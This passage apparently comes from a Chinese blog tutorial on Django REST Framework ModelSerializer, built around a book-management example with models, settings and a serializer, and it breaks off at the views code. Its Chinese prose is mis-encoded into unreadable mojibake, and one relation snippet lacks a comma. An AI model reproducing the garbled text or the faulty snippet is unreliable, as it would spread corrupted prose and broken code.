fa-external-link-alt"></i></span></li></ul><p>DRFÂ∏∏Áî®Â∫èÂàóÂåñÁ±ª‰∏ªË¶ÅÊúâ</p><ul><li><code>rest_framework.serialziers.Serializer</code></li><li><code>rest_framework.serialziers.ModelSerializer</code></li><li><code>rest_framework.serialziers.ListSerializer</code></li></ul><p>Êú¨ÁØá‰ªãÁªç<code>rest_framework.serialziers.ModelSerializer</code> ÔºåÂ∞ÜÁªìÂêàÂõæ‰π¶ÁÆ°ÁêÜÁ≥ªÁªüÂÆû‰æãËØ¥Êòé„ÄÇ</p><a id="more"></a><h1 id="Â∫èÂàóÂåñ‰ª•Â§ñÁöÑÂÖ∂‰ªñÈÖçÁΩÆ">Â∫èÂàóÂåñ‰ª•Â§ñÁöÑÂÖ∂‰ªñÈÖçÁΩÆ</h1><h2 id="settings.py"><code>settings.py</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'rest_framework'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/Shanghai'</span></span><br><span class="line">USE_I18N = <span class="literal">True</span></span><br><span class="line">USE_L10N = <span class="literal">True</span></span><br><span class="line">USE_TZ = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">MEDIA_URL = <span class="string">'/media/'</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">'media'</span>)</span><br></pre></td></tr></table></figure><h2 id="ÂÖ®Â±Äurl.py">ÂÖ®Â±Ä<code>url.py</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.conf.urls.static <span class="keyword">import</span> static</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'admin/'</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">'api/'</span>, include(<span class="string">'api.urls'</span>)),</span><br><span class="line">] + static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)</span><br></pre></td></tr></table></figure><h2 id="Êï∞ÊçÆÂ∫ìË°®">Êï∞ÊçÆÂ∫ìË°®</h2><h3 id="Ë°®‰∏ÄËßà">Ë°®‰∏ÄËßà</h3><ul><li><code>BaseModel</code>Âü∫Ë°®Ôºö<code>is_delete</code>„ÄÅ<code>create_time</code></li></ul><p>‰∏ãÈù¢ÂõõË°®ÁªßÊâøÂü∫Ë°®ÔºåÂèØ‰ª•ÁªßÊâø‰∏§‰∏™Â≠óÊÆµ</p><ul><li><code>Book</code>Ë°®Ôºö<code>name</code>„ÄÅ<code>price</code>„ÄÅ<code>img</code>„ÄÅ<code>authors</code>„ÄÅ<code>publish</code>„ÄÅ<code>is_delete</code>„ÄÅ<code>create_time</code></li><li><code>Publish</code>Ë°®Ôºö<code>name</code>„ÄÅ<code>address</code>„ÄÅ<code>is_delete</code>„ÄÅ<code>create_time</code></li><li><code>AuthorË°®</code>Ôºö<code>name</code>„ÄÅ<code>age</code>„ÄÅ<code>is_delete</code>„ÄÅ<code>create_time</code></li><li><code>AuthorDetail</code>Ë°®Ôºö<code>mobile, author</code>„ÄÅ<code>is_delete</code>„ÄÅ<code>create_time</code></li></ul><h3 id="Âü∫Ë°®‰ª£Á†Å">Âü∫Ë°®‰ª£Á†Å</h3><p><code>models.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    is_delete = models.BooleanField(default=<span class="literal">False</span>)</span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ËÆæÁΩÆ abstract = True Êù•Â£∞ÊòéÂü∫Ë°®Ôºå‰Ωú‰∏∫Âü∫Ë°®ÁöÑModel‰∏çËÉΩÂú®Êï∞ÊçÆÂ∫ì‰∏≠ÂΩ¢ÊàêÂØπÂ∫îÁöÑË°®</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        abstract = <span class="literal">True</span></span><br></pre></td></tr></table></figure><h3 id="Êñ≠ÂÖ≥ËÅîÂ§öË°®ÂÖ≥Á≥ªÈáçÁÇπ">Êñ≠ÂÖ≥ËÅîÂ§öË°®ÂÖ≥Á≥ªÔºàÈáçÁÇπÔºâ</h3><ol type="1"><li>Â§ñÈîÆ‰ΩçÁΩÆÔºö</li></ol><ul><li>‰∏ÄÂØπÂ§öÔºöÂ§ñÈîÆÊîæÂ§öÁöÑ‰∏ÄÊñπ</li><li>‰∏ÄÂØπ‰∏ÄÔºö‰ªéÈÄªËæëÊ≠£ÂèçÂêëËÄÉËôëÔºåÂ¶Ç‰ΩúËÄÖË°®‰∏é‰ΩúËÄÖËØ¶ÊÉÖË°®Ôºå‰ΩúËÄÖÂà†Èô§Á∫ßËÅî‰ΩúËÄÖËØ¶ÊÉÖ‰πüÂà†Èô§ÔºåËØ¶ÊÉÖÂà†Èô§‰ΩúËÄÖ‰æùÊóßÂ≠òÂú®ÔºåÊâÄ‰ª•Âª∫ËÆÆÂ§ñÈîÆÂú®ËØ¶ÊÉÖË°®‰∏≠ÔºàÂíå‰πãÂâçÁöÑ‰∏ÄÂØπ‰∏ÄÂÖ≥Á≥ªÂ§ñÈîÆÊîæÁΩÆ‰∏ç‰∏ÄÊ†∑Ôºå‰πãÂâçÈÉΩÊòØÊääÂ§ñÈîÆÊîæÂú®Êü•ËØ¢È¢ëÁéáÈ´òÁöÑË°®Ôºâ</li><li>Â§öÂØπÂ§öÔºöÂ§ñÈîÆÂú®ÂÖ≥Á≥ªË°®‰∏≠</li></ul><ol start="2" type="1"><li>ORMÊ≠£ÂêëÊñπÂêëËøûË°®Êü•ÊâæÔºö(Ê≥®Ôºö‰æùËµñ‰ª£Á†ÅËßÅ‰∏ãÊñπ)<ul><li>Ê≠£ÂêëÔºöÈÄöËøáÂ§ñÈîÆÂ≠óÊÆµ eg: <code>author_detial_obj.author</code>ÔºåÂ§ñÈîÆËÆæÁΩÆÂú®‰ΩúËÄÖËØ¶ÊÉÖË°®ÔºåÂú®‰ΩúËÄÖËØ¶ÊÉÖË°®‰∏≠Êü•ËØ¢‰ΩúËÄÖÁõ¥Êé•<code>.author</code>Â∞±ÂèØ‰ª•</li><li>ÂèçÂêëÔºöÈÄöËøáËÆæÁΩÆÂèçÂêëÊü•ËØ¢<code>related_name</code>ÁöÑÂÄº egÔºö<code>author_obj.detail</code>ÔºåÂ§ñÈîÆÊ≤°ÊúâËÆæÁΩÆÂú®‰ΩúËÄÖË°®‰∏≠ÔºåÂú®‰ΩúËÄÖË°®‰∏≠ÈÄöËøáËÆæÁΩÆÂèçÂêëÊü•ËØ¢<code>.detail</code>Êü•ËØ¢‰ΩúËÄÖËØ¶ÊÉÖ</li></ul></li><li>ËøûË°®Êìç‰ΩúÂÖ≥Á≥ªÔºöÔºàÊ≥®ÔºöÊãø‰ΩúËÄÖ‰∏é‰ΩúËÄÖËØ¶ÊÉÖË°®‰∏æ‰æãÔºåÂ§ñÈîÆÂª∫Âú®‰ΩúËÄÖËØ¶ÊÉÖË°®‰∏≠Ôºâ<ul><li>‰ΩúËÄÖÂà†Èô§ÔºåËØ¶ÊÉÖÁ∫ßËÅî <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">on_delete=models.CASCADE    <span class="comment">#Ë∑üÁùÄ‰∏ÄËµ∑Âà†Èô§</span></span><br></pre></td></tr></table></figure></li><li>‰ΩúËÄÖÂà†Èô§ÔºåËØ¶ÊÉÖÁΩÆÁ©∫ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">null=<span class="literal">True</span>, on_delete=models.SET_NULL   <span class="comment">#Â§ñÈîÆÂ≠óÊÆµÊ∏ÖÁ©∫</span></span><br></pre></td></tr></table></figure></li><li>‰ΩúËÄÖÂà†Èô§ÔºåËØ¶ÊÉÖÈáçÁΩÆ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default=<span class="number">0</span>, on_delete=models.SET_DEFAULT</span><br></pre></td></tr></table></figure></li><li>‰ΩúËÄÖÂà†Èô§ÔºåËØ¶ÊÉÖ‰∏çÂä® <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">on_delete=models.DO_NOTHING</span><br></pre></td></tr></table></figure></li></ul></li><li>Â§ñÈîÆÂÖ≥ËÅîÂ≠óÊÆµÁöÑÂèÇÊï∞ÔºöÂ¶Ç‰ΩïÂÆûÁé∞Êñ≠ÂÖ≥ËÅî„ÄÅÁõÆÂâçË°®Èó¥Êìç‰ΩúÂÖ≥Á≥ª„ÄÅÊñπÂêëÊü•ËØ¢Â≠óÊÆµ<ol type="1"><li>‰ΩúËÄÖËØ¶ÊÉÖË°®‰∏≠ÁöÑÔºàÂ§ñÈîÆËÆæÁΩÆÂú®‰ΩúËÄÖËØ¶ÊÉÖË°®‰∏≠Ôºâ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">author = models.OneToOneField(</span><br><span class="line">    to=<span class="string">'Author'</span>,       <span class="comment">#Âíå‰ΩúËÄÖË°®ÂÖ≥ËÅî</span></span><br><span class="line">    related_name=<span class="string">'detail'</span>,   <span class="comment">#ÂèçÊü•ËØ¢Ôºå‰ΩúËÄÖË°®Áõ¥Êé•Êü•‰ΩúËÄÖËØ¶ÊÉÖË°®ÁöÑÁîµËØùÂè∑Á†ÅÔºåÂèØ‰ª•Áõ¥Êé•author_obj.detail.mobile</span></span><br><span class="line">    db_constraint=<span class="literal">False</span>,     <span class="comment">#Êñ≠ÂÖ≥ËÅî</span></span><br><span class="line">    on_delete=models.CASCADE  <span class="comment">#Á∫ßËÅîÂà†Èô§</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li>Âõæ‰π¶Ë°®‰∏≠ÁöÑ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">publish = models.ForeignKey(</span><br><span class="line">    to=<span class="string">'Publish'</span>,</span><br><span class="line">    related_name=<span class="string">'books'</span>,</span><br><span class="line">    db_constraint=<span class="literal">False</span>,</span><br><span class="line">    on_delete=models.DO_NOTHING,</span><br><span class="line">)</span><br><span class="line">authors = models.ManyToManyField(</span><br><span class="line">    to=<span class="string">'Author'</span></span><br><span class="line">    related_name=<span class="string">'books'</span>,</span><br><span class="line">    db_constraint=<span class="literal">False</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li></ol></li></ol><div class="note warning"><p>Ê≥®ÊÑèÔºö</p><ul><li><code>ManyToManyField</code>‰∏çËÉΩËÆæÁΩÆ<code>on_delete</code></li><li><code>OneToOneField</code>„ÄÅ<code>ForeignKey</code>ÂøÖÈ°ªËÆæÁΩÆ<code>on_delete</code>Ôºàdjango1.xÁ≥ªÁªüÈªòËÆ§Á∫ßËÅîÔºå‰ΩÜÊòØdjango2.xÂøÖÈ°ªÊâãÂä®ÊòéÁ°ÆÔºâ</li></ul></div><h3 id="ÂêÑË°®‰ª£Á†Å">ÂêÑË°®‰ª£Á†Å</h3><details><p><summary> models.py </summary></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># Âü∫Á±ª</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    is_delete = models.BooleanField(default=<span class="literal">False</span>)  <span class="comment"># ÈªòËÆ§‰∏çÊòØÂà†Èô§ÔºåÊï∞ÊçÆÂ∫ì‰∏≠ÊòØ0/1</span></span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ËÆæÁΩÆ abstract = True Êù•Â£∞ÊòéÂü∫Ë°®Ôºå‰Ωú‰∏∫Âü∫Ë°®ÁöÑModel‰∏çËÉΩÂú®Êï∞ÊçÆÂ∫ì‰∏≠ÂΩ¢ÊàêÂØπÂ∫îÁöÑË°®</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        abstract = <span class="literal">True</span>  <span class="comment"># Â£∞ÊòéËØ•Ë°®Âè™ÊòØ‰∏Ä‰∏™ÊäΩË±°Ë°®‰∏çÂá∫Áé∞Âú®Êï∞ÊçÆÂ∫ì‰∏≠</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ‰π¶Á±çË°®</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    price = models.DecimalField(max_digits=<span class="number">5</span>, decimal_places=<span class="number">2</span>)</span><br><span class="line">    img = models.ImageField(upload_to=<span class="string">'img'</span>, default=<span class="string">'default.jpg'</span>)</span><br><span class="line">    <span class="comment"># ÂÖ≥ËÅîÂá∫ÁâàÁ§æË°®</span></span><br><span class="line">    publish = models.ForeignKey(</span><br><span class="line">        to=<span class="string">'Publish'</span>,  <span class="comment"># ÂÖ≥ËÅîpublishË°®</span></span><br><span class="line">        db_constraint=<span class="literal">False</span>,  <span class="comment"># Êñ≠ÂÖ≥ËÅîÔºàÊñ≠ÂºÄBookË°®ÂíåPublishË°®ÁöÑÂÖ≥ËÅî,Êñπ‰æøÂà†Êï∞ÊçÆ,ËôΩÁÑ∂Êñ≠ÂºÄ‰∫ÜÂÖ≥ËÅî‰ΩÜÊòØËøòËÉΩÊ≠£Â∏∏‰ΩøÁî®Ôºâ</span></span><br><span class="line">        related_name=<span class="string">'books'</span>,  <span class="comment"># ÂèçÂêëÊü•ËØ¢Â≠óÊÆµÔºöpublish_obj.booksÂ∞±ËÉΩÊü•Âá∫ÂΩìÂâçÂá∫ÁâàÁ§æÂá∫ÁâàÁöÑÁöÑÊâÄÊúâ‰π¶Á±ç</span></span><br><span class="line">        on_delete=models.DO_NOTHING,  <span class="comment"># ËÆæÁΩÆËøûË°®Êìç‰ΩúÂÖ≥Á≥ª</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># ÂÖ≥ËÅî‰ΩúËÄÖË°®</span></span><br><span class="line">    authors = models.ManyToManyField(</span><br><span class="line">        to=<span class="string">'Author'</span>,</span><br><span class="line">        db_constraint=<span class="literal">False</span>,  <span class="comment"># Êñ≠ÂºÄÂÖ≥ËÅî</span></span><br><span class="line">        related_name=<span class="string">'books'</span>,  <span class="comment"># ÂèçÂêëÊü•ËØ¢Â≠óÊÆµ</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Â∫èÂàóÂåñÊèíÊãîÂºèÂ±ûÊÄß - ÂÆåÊàêËá™ÂÆö‰πâÂ≠óÊÆµÂêçÂÆåÊàêËøûË°®Êü•ËØ¢</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">publish_name</span><span class="params">(self)</span>:</span>  <span class="comment"># Ëá™ÂÆö‰πâÊü•ËØ¢Âá∫ÁâàÁ§æÂêçÂ≠ó</span></span><br><span class="line">        <span class="keyword">return</span> self.publish.name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">author_list</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.authors.values(<span class="string">'name'</span>, <span class="string">'age'</span>, <span class="string">'detail__mobile'</span>).all()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'book'</span></span><br><span class="line">        verbose_name = <span class="string">'‰π¶Á±ç'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">        unique_together = (<span class="string">'name'</span>, <span class="string">'publish'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># Âá∫ÁâàÁ§æË°®</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Publish</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""name„ÄÅaddress„ÄÅis_delete„ÄÅcreate_time"""</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    address = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'publish'</span></span><br><span class="line">        verbose_name = <span class="string">'Âá∫ÁâàÁ§æ'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># ‰ΩúËÄÖË°®</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Author</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""name„ÄÅage„ÄÅis_delete„ÄÅcreate_time"""</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    age = models.IntegerField()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'author'</span></span><br><span class="line">        verbose_name = <span class="string">'‰ΩúËÄÖ'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># ‰ΩúËÄÖËØ¶ÊÉÖ</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthorDetail</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""mobile, author„ÄÅis_delete„ÄÅcreate_time"""</span></span><br><span class="line">    mobile = models.CharField(max_length=<span class="number">11</span>)</span><br><span class="line">    author = models.OneToOneField(</span><br><span class="line">        to=<span class="string">'Author'</span>,</span><br><span class="line">        db_constraint=<span class="literal">False</span>,</span><br><span class="line">        related_name=<span class="string">'detail'</span>,</span><br><span class="line">        on_delete=models.CASCADE</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'author_detail'</span></span><br><span class="line">        verbose_name = <span class="string">'‰ΩúËÄÖËØ¶ÊÉÖ'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.author.name</span><br></pre></td></tr></table></figure></details><h1 id="serializers.modelserializer">serializers.ModelSerializer</h1><h2 id="Â∫èÂàóÂåñ-ÂèçÂ∫èÂàóÂåñ">Â∫èÂàóÂåñ &amp; ÂèçÂ∫èÂàóÂåñ</h2><h3 id="Â∫èÂàóÂåñ">Â∫èÂàóÂåñ</h3><p><code>ModelSerializer</code>Ê®°ÂûãÁ±ªÂ∫èÂàóÂåñÂô®‰∏éÂ∏∏ËßÑÁöÑ<code>Serializer</code>Áõ∏ÂêåÔºå‰ΩÜÊèê‰æõ‰∫ÜÔºö</p><ol type="1"><li>Âü∫‰∫éÊ®°ÂûãÁ±ªËá™Âä®ÁîüÊàê‰∏ÄÁ≥ªÂàóÂ≠óÊÆµ</li><li>ÂåÖÂê´ÈªòËÆ§ÁöÑ<code>create()</code>Âíå<code>update()</code>ÁöÑÂÆûÁé∞</li><li>Âü∫‰∫éÊ®°ÂûãÁ±ªËá™Âä®‰∏∫<code>Serializer</code>ÁîüÊàê<code>validators</code>ÔºåÊØîÂ¶Ç<code>unique_together</code></li></ol><h4 id="Â∫èÂàóÂåñÂ±Ç-apiserializers.py">Â∫èÂàóÂåñÂ±Ç <code>api/serializers.py</code></h4><details><p><summary> <b><i>Source Code</i></b> </summary></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.serializers <span class="keyword">import</span> ModelSerializer, SerializerMethodField</span><br><span class="line"><span class="keyword">from</span> rest_framework.exceptions <span class="keyword">import</span> ValidationError</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># ÂèØ‰ª•ÂçïÁã¨‰Ωú‰∏∫PublishÊé•Âè£ÁöÑÂ∫èÂàóÂåñÁ±ªÔºå‰πüÂèØ‰ª•‰Ωú‰∏∫BookÂ∫èÂàóÂåñÂ§ñÈîÆpublishËæÖÂä©ÁöÑÂ∫èÂàóÂåñÁªÑ‰ª∂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PublishModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Publish</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'address'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># BookÊé•Âè£Â∫èÂàóÂåñ</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># ‰∫ÜËß£: 1.ËøòÂèØ‰ª•Ëá™ÂÆö‰πâËÆæÁΩÆÂ∫èÂàóÂåñÂ≠óÊÆµÔºå‰ΩÜÊòØÂøÖÈ°ªÂú®fields‰∏≠Â£∞ÊòéÔºåÂú®fields‰∏≠ÂÜôpublish_address</span></span><br><span class="line">    <span class="comment"># publish_address = SerializerMethodField()</span></span><br><span class="line">    <span class="comment"># def get_publish_address(self, obj):</span></span><br><span class="line">    <span class="comment">#     return obj.publish.address</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. Ëá™ÂÆö‰πâËøûË°®Ê∑±Â∫¶-Â≠êÂ∫èÂàóÂåñÊñπÂºè-ËØ•ÊñπÂºè‰∏çËÉΩÂèÇ‰∏éÂèçÂ∫èÂàóÂåñÔºå‰ΩøÁî®Âú®Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÂÖ±Â≠òÊó∂Ôºå‰∏çËÉΩ‰π¶ÂÜô</span></span><br><span class="line">    publish = PublishModelSerializer()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        <span class="comment"># Â∫èÂàóÂåñÁ±ªÂÖ≥ËÅîÁöÑmodelÁ±ª</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        <span class="comment"># ÂèÇ‰∏éÂ∫èÂàóÂåñÁöÑÂ≠óÊÆµ</span></span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>, <span class="string">'img'</span>, <span class="string">'author_list'</span>, <span class="string">'publish'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ‰∫ÜËß£Áü•ËØÜÁÇπ</span></span><br><span class="line">        <span class="comment"># ÊâÄÊúâÂ≠óÊÆµ</span></span><br><span class="line">        <span class="comment"># fields = '__all__'</span></span><br><span class="line">        <span class="comment"># ‰∏éfields‰∏çÂÖ±Â≠òÔºåexcludeÊéíÈô§Âì™‰∫õÂ≠óÊÆµ</span></span><br><span class="line">        <span class="comment"># exclude = ('id', 'is_delete', 'create_time')</span></span><br><span class="line">        <span class="comment"># Ëá™Âä®ËøûË°®Ê∑±Â∫¶</span></span><br><span class="line">        <span class="comment"># depth = 1</span></span><br></pre></td></tr></table></figure></details><h4 id="ËßÜÂõæÂ±Ç-views.py">ËßÜÂõæÂ±Ç <code>views.py</code></h4><details><p><summary> <b><i>Source Code</i></b> </summary></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models,serializers</span><br><span 